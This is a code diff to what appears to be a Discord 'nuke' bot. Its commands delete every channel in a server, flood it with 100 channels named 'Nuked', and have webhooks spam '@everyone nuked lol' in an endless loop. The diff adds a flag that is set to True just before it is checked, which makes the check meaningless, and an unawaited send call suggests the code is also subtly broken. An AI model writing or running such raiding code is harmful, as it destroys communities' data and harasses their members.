@@ -40,6 +40,8 @@ async def emojinuke(ctx):
 
 @o.command()
 async def nuke(ctx):
+  global nooke
+  nooke = True
     try:
         for channel in ctx.guild.channels:
             await channel.delete()
@@ -54,12 +56,18 @@ async def ccflood(ctx):
     for i in range(100):
         await ctx.guild.create_text_channel(name="Nuked")  
 
+        
+nooke = False
+        
 @o.event
 async def on_guild_channel_create(channel):
+  global nooke
+  nooke = True
+  if nooke == True:
     try:
       webhook = await channel.create_webhook(name="nuked")
       while True:
-        webhook.send("everyone")
+        webhook.send("@everyone nuked lol")
     except:
         pass
 
